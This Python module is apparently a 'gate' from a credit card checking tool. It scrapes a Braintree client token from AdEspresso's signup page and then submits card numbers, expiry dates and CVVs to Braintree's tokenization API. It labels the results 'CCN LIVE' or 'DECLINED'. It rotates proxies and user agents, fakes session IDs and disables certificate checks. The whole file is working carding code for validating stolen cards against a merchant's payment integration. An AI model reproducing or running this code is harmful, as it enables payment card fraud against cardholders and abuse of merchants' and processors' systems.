"""
AdEspresso Auth Gate
AUTH ONLY - validates card without charging
Uses AdEspresso's subscription page with Braintree integration
"""

import requests
import re
import json
import base64
import random
import time
from typing import Tuple
from faker import Faker
from user_agent import generate_user_agent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ADESPRESSO_URL = "https://adespresso.com"


def _generate_session_id() -> str:
    """Generate a Braintree session ID"""
    return f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"


def _extract_client_token(session: requests.Session, ua: str) -> Tuple[str, str]:
    """
    Extract Braintree client token from AdEspresso join page
    Returns (authorization_fingerprint, error_msg)
    """
    url = f"{ADESPRESSO_URL}/join-services/"
    
    headers = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
    }
    
    try:
        response = session.get(url, headers=headers, timeout=30, verify=False)
        
        if response.status_code != 200:
            return None, f"Page error {response.status_code}"
        
        html = response.text
        
        auth_patterns = [
            r'var\s+braintree_client_token\s*=\s*["\']([A-Za-z0-9+/=]+)["\']',
            r'data-client-token="([A-Za-z0-9+/=]+)"',
            r'"client_token"\s*:\s*"([A-Za-z0-9+/=]+)"',
            r'authorization\s*[=:]\s*["\']([A-Za-z0-9+/=]{100,})["\']',
            r'clientToken["\s:]+["\']([A-Za-z0-9+/=]+)["\']',
        ]
        
        for pattern in auth_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                try:
                    token_b64 = match.group(1)
                    decoded = base64.b64decode(token_b64).decode('utf-8')
                    auth_match = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                    if auth_match:
                        return auth_match.group(1), None
                except:
                    continue
        
        if 'braintree' in html.lower():
            return None, "Token in dynamic JS"
        
        return None, "Token not found"
        
    except Exception as e:
        return None, str(e)[:50]


def _tokenize_card(session: requests.Session, auth: str, ua: str,
                    card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> Tuple[str, str]:
    """
    Tokenize card via Braintree GraphQL API
    Returns (token, error_msg)
    """
    url = "https://payments.braintree-api.com/graphql"
    
    if len(card_yer) == 2:
        full_year = f"20{card_yer}"
    else:
        full_year = card_yer
    
    session_id = _generate_session_id()
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin",
            "sessionId": session_id
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_num,
                    "expirationMonth": card_mon,
                    "expirationYear": full_year,
                    "cvv": card_cvc,
                    "billingAddress": {
                        "postalCode": "10001",
                        "streetAddress": "123 Main St"
                    }
                },
                "options": {
                    "validate": True
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    
    headers = {
        'User-Agent': ua,
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Authorization': f'Bearer {auth}',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Referer': 'https://assets.braintreegateway.com/',
    }
    
    try:
        response = session.post(url, json=payload, headers=headers, timeout=30, verify=False)
        
        if response.status_code == 401:
            return None, "Auth token expired"
        
        if response.status_code >= 400:
            return None, f"API error {response.status_code}"
        
        data = response.json()
        
        if 'errors' in data and data['errors']:
            error_msg = data['errors'][0].get('message', 'Unknown error')
            
            error_lower = error_msg.lower()
            if 'cvv' in error_lower or 'cvc' in error_lower or 'security code' in error_lower:
                return None, "CVV_ERROR"
            elif 'expired' in error_lower:
                return None, "EXPIRED"
            elif 'invalid' in error_lower and 'number' in error_lower:
                return None, "INVALID_NUMBER"
            elif 'luhn' in error_lower:
                return None, "INVALID_LUHN"
            
            return None, error_msg
        
        token = data.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if token:
            card_info = data.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {})
            brand = card_info.get('brandCode', 'CARD')
            last4 = card_info.get('last4', card_num[-4:])
            return token, f"{brand}...{last4}"
        
        return None, "No token in response"
        
    except Exception as e:
        return None, str(e)[:50]


def adespresso_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                          proxy=None) -> Tuple[str, bool]:
    """
    AdEspresso AUTH check via Braintree tokenization
    Note: Tokenization validates card format and may catch CVV errors,
    but cannot perform full bank validation without server-side integration.
    
    Returns: (status_message, proxy_alive)
    """
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    from gates.utilities import parse_proxy
    
    session = requests.Session()
    proxies = parse_proxy(proxy)
    if proxies:
        session.proxies = proxies
    
    ua = generate_user_agent()
    
    auth, error = _extract_client_token(session, ua)
    
    if not auth:
        return (f"Error: Could not extract auth token - {error}", False)
    
    token, result = _tokenize_card(session, auth, ua, card_num, card_mon, card_yer, card_cvc)
    
    if not token:
        if result == "CVV_ERROR":
            return ("CCN LIVE - CVV Mismatch (Auth Only)", True)
        elif result == "EXPIRED":
            return ("DECLINED - Expired Card", True)
        elif result == "INVALID_NUMBER":
            return ("DECLINED - Invalid Card Number", True)
        elif result == "INVALID_LUHN":
            return ("DECLINED - Invalid Card (Luhn)", True)
        elif result == "Auth token expired":
            return ("Error: Auth token expired", False)
        else:
            return (f"DECLINED - {result[:40]}", True)
    
    return (f"CCN LIVE - Tokenized ({result})", True)


def health_check() -> bool:
    """Quick health check for AdEspresso auth"""
    try:
        response = requests.get(f"{ADESPRESSO_URL}/join-services/", timeout=10, verify=False)
        return response.status_code == 200
    except:
        return False
